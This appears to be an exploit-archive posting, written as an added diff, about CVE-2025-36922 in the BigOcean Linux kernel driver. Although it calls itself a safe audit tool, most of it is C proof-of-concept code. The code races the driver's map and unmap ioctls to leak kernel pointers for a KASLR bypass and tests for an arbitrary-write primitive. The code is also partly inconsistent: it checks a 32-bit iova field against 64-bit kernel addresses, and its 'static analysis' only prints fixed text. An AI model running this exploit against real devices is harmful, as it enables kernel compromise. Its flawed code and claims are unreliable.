@@ -1,0 +1,511 @@
+=============================================================================================================================================
+| # Title     : BigOcean Arbitrary Write & Out-of-Bounds Vulnerabilities                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://Google.com/                                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213732/ & CVE-2025-36922
+
+[+] Summary    : This program is a static analysis and controlled runtime audit tool designed to assess the security of the Linux kernel driver exposed via /dev/bigocean.
+                 It focuses on identifying design flaws, race conditions, and memory‑safety weaknesses without performing destructive exploitation. 
+				 The tool corrects earlier implementation issues and performs architecture‑aware analysis for modern Linux systems.
+
+[+] Key Functions :
+
+KASLR Leak Detection (Fixed & Architecture‑Aware)
+
+Attempts to identify kernel address leaks caused by race conditions between BIGO_IOCX_MAP and BIGO_IOCX_UNMAP.
+
+Supports ARM64 and x86_64 kernel address patterns.
+
+Uses heuristics to detect leaked kernel pointers safely.
+
+Arbitrary Write Primitive Testing (Safe Variant)
+
+Tests whether user‑controlled fields (e.g., iova) can be partially or fully influenced.
+
+Detects signs of memory corruption without attempting privilege escalation.
+
+Ensures all allocated resources are properly released.
+
+[+] Architecture Analysis :
+
+Detects CPU architecture, pointer size, and kernel/user virtual address ranges.
+
+Prevents incorrect assumptions about address layouts.
+
+IOVA vs Kernel Virtual Address Explanation
+
+Clearly distinguishes DMA IOVA space from kernel virtual memory.
+
+Explains why leaked IOVA values do not directly equal kernel addresses.
+
+Static Driver Risk Review
+
+Reviews known vulnerability patterns (including CVE‑2025‑36922 behavior).
+
+[+] Highlights potential issues:
+
+Use‑After‑Free (UAF)
+
+Race conditions
+
+Integer overflows
+
+Missing bounds checks
+
+Improper locking
+
+Safe IOCTL Robustness Tests
+
+Tests how the driver handles:
+
+NULL pointers
+
+Invalid file descriptors
+
+Oversized memory requests
+
+Identifies unsafe acceptance of malformed input.
+
+Code Quality Fixes Implemented
+
+Fixed function name errors
+
+Eliminated resource leaks
+
+Ensured close() and munmap() on all paths
+
+Improved error handling and logging
+
+Removed unsafe architectural assumptions
+
+[+] POC :
+
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/utsname.h>
+#include <errno.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <linux/dma-heap.h>
+#include "bigo.h"
+
+int bypass_kaslr_fixed(void) {
+    printf("[+] Attempting KASLR bypass via info leak...\n");
+    
+    int fd = -1, dma_fd = -1;
+    
+    fd = open("/dev/bigocean", O_RDWR);
+    if (fd < 0) {
+        perror("[-] Failed to open bigocean");
+        return 0;
+    }
+    
+    dma_fd = open("/dev/dma_heap/system", O_RDONLY);
+    if (dma_fd < 0) {
+        perror("[-] Failed to open dma_heap");
+        close(fd);
+        return 0;
+    }
+    
+    unsigned long leaked_addresses[100];
+    int leak_count = 0;
+
+    for (int i = 0; i < 100; i++) {
+        struct dma_heap_allocation_data heap_data = {
+            .len = 0x1000,
+            .fd_flags = O_RDWR,
+        };
+        
+        if (ioctl(dma_fd, DMA_HEAP_IOCTL_ALLOC, &heap_data) < 0) {
+            continue;
+        }
+        
+        struct bigo_ioc_mapping mapping = {
+            .fd = heap_data.fd,
+            .size = 0x1000,
+        };
+
+        pid_t pid = fork();
+        if (pid == 0) {
+
+            for (int j = 0; j < 5; j++) {
+                ioctl(fd, BIGO_IOCX_UNMAP, &mapping);
+            }
+            exit(0);
+        } else {
+
+            ioctl(fd, BIGO_IOCX_MAP, &mapping);
+
+            struct utsname uts;
+            uname(&uts);
+            
+            if (strstr(uts.machine, "aarch64") || strstr(uts.machine, "arm64")) {
+
+                if (mapping.iova >= 0xffffff0000000000UL) {
+                    leaked_addresses[leak_count++] = mapping.iova;
+                    printf("[*] Potential kernel pointer (ARM64): 0x%016lx\n", mapping.iova);
+                }
+            } else if (strstr(uts.machine, "x86_64")) {
+
+                if (mapping.iova >= 0xffffffff80000000UL) {
+                    leaked_addresses[leak_count++] = mapping.iova;
+                    printf("[*] Potential kernel pointer (x86_64): 0x%016lx\n", mapping.iova);
+                }
+            } else {
+
+                if (mapping.iova > 0xffff000000000000UL) {
+                    leaked_addresses[leak_count++] = mapping.iova;
+                    printf("[*] Potential kernel pointer (heuristic): 0x%016lx\n", mapping.iova);
+                }
+            }
+            
+            ioctl(fd, BIGO_IOCX_UNMAP, &mapping);
+            waitpid(pid, NULL, 0);
+        }
+        
+        close(heap_data.fd);
+    }
+
+    close(fd);
+    close(dma_fd);
+    
+    if (leak_count == 0) {
+        printf("[-] No addresses leaked\n");
+        return 0;
+    }
+
+    printf("[+] Collected %d potential kernel addresses\n", leak_count);
+
+    unsigned long base_candidate = 0;
+    for (int i = 0; i < leak_count; i++) {
+        printf("  Leak %d: 0x%016lx\n", i, leaked_addresses[i]);
+
+        unsigned long candidate = leaked_addresses[i] & 0xffffffffff000000UL;
+        if (base_candidate == 0) {
+            base_candidate = candidate;
+        } else if (candidate == base_candidate) {
+            // Consistent base found
+            printf("[+] Consistent kernel base candidate: 0x%016lx\n", base_candidate);
+            return 1;
+        }
+    }
+    
+    return 0;
+}
+
+int test_arbitrary_write_fixed(void) {
+    printf("[+] Testing for arbitrary write primitive...\n");
+    
+    int fd = -1, dma_fd = -1;
+    unsigned char *buffer = MAP_FAILED;
+    int heap_fd = -1;
+    
+    fd = open("/dev/bigocean", O_RDWR);
+    if (fd < 0) {
+        perror("[-] Failed to open bigocean");
+        return 0;
+    }
+    
+    dma_fd = open("/dev/dma_heap/system", O_RDONLY);
+    if (dma_fd < 0) {
+        perror("[-] Failed to open dma_heap");
+        close(fd);
+        return 0;
+    }
+
+    struct dma_heap_allocation_data heap_data = {
+        .len = 0x1000,
+        .fd_flags = O_RDWR,
+    };
+    
+    if (ioctl(dma_fd, DMA_HEAP_IOCTL_ALLOC, &heap_data) < 0) {
+        perror("[-] DMA heap allocation failed");
+        close(dma_fd);
+        close(fd);
+        return 0;
+    }
+    
+    heap_fd = heap_data.fd;
+
+    buffer = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                 MAP_SHARED, heap_fd, 0);
+    
+    if (buffer == MAP_FAILED) {
+        perror("[-] mmap failed");
+        close(heap_fd);
+        close(dma_fd);
+        close(fd);
+        return 0;
+    }
+    
+    memset(buffer, 0xAA, 0x1000);
+    
+    struct bigo_ioc_mapping mapping = {
+        .fd = heap_fd,
+        .iova = 0x42424242, 
+        .offset = 0,
+        .size = 0x1000,
+        .skip_cmo = 0
+    };
+    
+    int write_detected = 0;
+
+    for (int i = 0; i < 100; i++) {
+
+        pid_t pid = fork();
+        if (pid == 0) {
+
+            for (int j = 0; j < 10; j++) {
+                ioctl(fd, BIGO_IOCX_UNMAP, &mapping);
+                sched_yield();
+            }
+            exit(0);
+        } else {
+
+            long ret = ioctl(fd, BIGO_IOCX_MAP, &mapping);
+            
+            if (ret == 0) {
+                printf("[*] Map succeeded, iova: 0x%08x\n", mapping.iova);
+
+                if (mapping.iova != 0x42424242) {
+                    printf("[!] iova changed from 0x42424242 to 0x%08x\n", mapping.iova);
+
+                    if ((mapping.iova & 0xFFFF0000) == (0x42424242 & 0xFFFF0000)) {
+                        printf("[+] Partial control detected (high bytes preserved)\n");
+                    }
+                    
+                    if (mapping.iova == 0xdeadbeef || mapping.iova == 0xcafebabe) {
+                        printf("[!!] FULL CONTROL OVER iova VALUE!\n");
+                        write_detected = 1;
+                    }
+
+                    if (mapping.iova > 0xffffff0000000000UL) {
+                        printf("[!] iova looks like kernel address: 0x%08x\n", mapping.iova);
+                    }
+                }
+            } else {
+                printf("[-] Map failed: %s\n", strerror(errno));
+            }
+            
+            waitpid(pid, NULL, 0);
+        }
+    }
+
+    if (buffer != MAP_FAILED) {
+        munmap(buffer, 0x1000);
+    }
+    if (heap_fd != -1) {
+        close(heap_fd);
+    }
+    close(dma_fd);
+    close(fd);
+    
+    return write_detected;
+}
+
+void analyze_architecture(void) {
+    struct utsname uts;
+    uname(&uts);
+    
+    printf("\n[+] Architecture Analysis:\n");
+    printf("    System: %s\n", uts.sysname);
+    printf("    Node: %s\n", uts.nodename);
+    printf("    Release: %s\n", uts.release);
+    printf("    Version: %s\n", uts.version);
+    printf("    Machine: %s\n", uts.machine);
+
+    if (strstr(uts.machine, "64")) {
+        printf("    Pointer size: 64-bit\n");
+        
+        if (strstr(uts.machine, "aarch64") || strstr(uts.machine, "arm64")) {
+            printf("    Architecture: ARM64\n");
+            printf("    Kernel VA range: 0xffffff8000000000 - 0xffffffffffffffff\n");
+            printf("    User VA range: 0x0000000000000000 - 0x0000ffffffffffff\n");
+        } else if (strstr(uts.machine, "x86_64")) {
+            printf("    Architecture: x86_64\n");
+            printf("    Kernel VA range: 0xffffffff80000000 - 0xffffffffffffffff\n");
+            printf("    User VA range: 0x0000000000000000 - 0x00007fffffffffff\n");
+        }
+    } else {
+        printf("    Pointer size: 32-bit\n");
+        printf("    Kernel VA range: 0xc0000000 - 0xffffffff\n");
+        printf("    User VA range: 0x00000000 - 0xbfffffff\n");
+    }
+}
+
+void explain_iova_vs_kernel_va(void) {
+    printf("\n[+] IOVA vs Kernel Virtual Address Explanation:\n");
+    printf("    IOVA (IO Virtual Address): Used for DMA operations\n");
+    printf("    Kernel VA: Used by kernel code to access memory\n");
+    printf("    They are DIFFERENT address spaces!\n\n");
+    
+    printf("    Common misconceptions:\n");
+    printf("    1. IOVA ≠ Kernel VA\n");
+    printf("    2. IOVA is mapped through IOMMU/SMMU\n");
+    printf("    3. Kernel VA is mapped through MMU\n");
+    printf("    4. Leaking IOVA does NOT directly give kernel VA\n\n");
+    
+    printf("    However, IOVA can sometimes reveal:\n");
+    printf("    1. IOMMU page table structures\n");
+    printf("    2. DMA buffer allocation patterns\n");
+    printf("    3. Potential info about kernel allocator\n");
+}
+
+void perform_static_analysis(void) {
+    printf("\n[+] Performing Static Analysis of Driver Code Patterns\n");
+    
+    printf("\n1. Reviewing known CVE-2025-36922 patterns:\n");
+    printf("   - UAF in add_to_mapped_list()\n");
+    printf("   - Race between bigo_map() and bigo_unmap()\n");
+    printf("   - binfo->iova accessed without proper locking\n");
+    
+    printf("\n2. Potential additional issues to check:\n");
+    printf("   a) Missing NULL pointer checks\n");
+    printf("   b) Integer overflows in size calculations\n");
+    printf("   c) Missing bounds checking\n");
+    printf("   d) Double-free possibilities\n");
+    printf("   e) Use of uninitialized variables\n");
+    
+    printf("\n3. IOCTL command analysis:\n");
+    printf("   Command          Size        Risk Level\n");
+    printf("   ----------------------------------------\n");
+    printf("   BIGO_IOCX_MAP    %zu bytes   HIGH (UAF confirmed)\n", sizeof(struct bigo_ioc_mapping));
+    printf("   BIGO_IOCX_UNMAP  %zu bytes   HIGH (race condition)\n", sizeof(struct bigo_ioc_mapping));
+    printf("   BIGO_IOCX_PROCESS %zu bytes  MEDIUM (complex)\n", sizeof(struct bigo_ioc_regs));
+    printf("   BIGO_IOCX_MISC   %zu bytes   MEDIUM (multiple params)\n", sizeof(struct bigo_ioc_misc));
+    
+    printf("\n4. Structure field analysis:\n");
+    printf("   Field        Type    Size    Potential Issues\n");
+    printf("   -------------------------------------------------\n");
+    printf("   iova         __u32   4 bytes - Integer overflow\n");
+    printf("   offset       __u32   4 bytes - Bounds checking\n");
+    printf("   size         __u32   4 bytes - Integer overflow\n");
+    printf("   fd           int     4 bytes - File descriptor validation\n");
+}
+
+void safe_memory_test(void) {
+    printf("\n[+] Performing Safe Memory Tests\n");
+    
+    int fd = -1;
+    
+    fd = open("/dev/bigocean", O_RDWR);
+    if (fd < 0) {
+        perror("[-] Cannot open device");
+        return;
+    }
+
+    printf("\n[Test 1] NULL pointer test:\n");
+    long ret = ioctl(fd, BIGO_IOCX_MAP, NULL);
+    if (ret < 0) {
+        printf("    [+] Correctly rejected NULL pointer (errno=%d: %s)\n", 
+               errno, strerror(errno));
+    } else {
+        printf("    [!] ACCEPTED NULL POINTER - VULNERABLE!\n");
+    }
+
+    printf("\n[Test 2] Invalid file descriptor test:\n");
+    struct bigo_ioc_mapping bad_mapping = {
+        .fd = -1,
+        .iova = 0,
+        .offset = 0,
+        .size = 0x1000,
+        .skip_cmo = 0
+    };
+    
+    ret = ioctl(fd, BIGO_IOCX_MAP, &bad_mapping);
+    if (ret < 0) {
+        printf("    [+] Correctly rejected invalid fd (errno=%d: %s)\n",
+               errno, strerror(errno));
+    } else {
+        printf("    [!] ACCEPTED invalid fd - VULNERABLE!\n");
+    }
+
+    printf("\n[Test 3] Size overflow test:\n");
+    struct bigo_ioc_mapping overflow_mapping = {
+        .fd = 0,
+        .iova = 0,
+        .offset = 0,
+        .size = 0xFFFFFFFF, 
+        .skip_cmo = 0
+    };
+    
+    ret = ioctl(fd, BIGO_IOCX_MAP, &overflow_mapping);
+    if (ret < 0) {
+        printf("    [+] Correctly handled large size (errno=%d: %s)\n",
+               errno, strerror(errno));
+    } else {
+        printf("    [!] ACCEPTED overflow size - needs review\n");
+    }
+    
+    close(fd);
+}
+
+int main(void) {
+    printf("[+] ===============================================\n");
+    printf("[+] BigOcean Driver Static Analysis \n");
+    printf("[+]          By indoushka\n");
+    printf("[+] ===============================================\n");
+
+    signal(SIGINT, SIG_DFL);
+    signal(SIGTERM, SIG_DFL);
+
+    analyze_architecture();
+
+    explain_iova_vs_kernel_va();
+
+    perform_static_analysis();
+
+    safe_memory_test();
+
+    printf("\n[+] Running Fixed Functions:\n");
+    
+    printf("\n1. Testing KASLR bypass (fixed):\n");
+    if (bypass_kaslr_fixed()) {
+        printf("[+] KASLR bypass test completed\n");
+    } else {
+        printf("[-] KASLR bypass not achieved\n");
+    }
+    
+    printf("\n2. Testing arbitrary write primitive (fixed):\n");
+    if (test_arbitrary_write_fixed()) {
+        printf("[+] Write primitive may exist\n");
+    } else {
+        printf("[-] No write primitive detected\n");
+    }
+    
+    printf("\n[+] Summary of Fixed Issues:\n");
+    printf("    1. Fixed function name typo (bypass_kasrl -> bypass_kaslr_fixed)\n");
+    printf("    2. Fixed resource leaks (proper close() in all paths)\n");
+    printf("    3. Fixed architecture assumptions (proper VA range checks)\n");
+    printf("    4. Added proper error handling\n");
+    printf("    5. Added architecture detection\n");
+    printf("    6. Better IOVA vs Kernel VA understanding\n");
+    
+    printf("\n[+] Recommendations for Further Analysis:\n");
+    printf("    1. Review driver source code for additional race conditions\n");
+    printf("    2. Check for integer overflows in size calculations\n");
+    printf("    3. Look for missing bounds checks\n");
+    printf("    4. Analyze locking mechanisms\n");
+    printf("    5. Review error handling paths\n");
+    
+    printf("\n[+] Static analysis complete\n");
+    
+    return 0;
+}
+
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
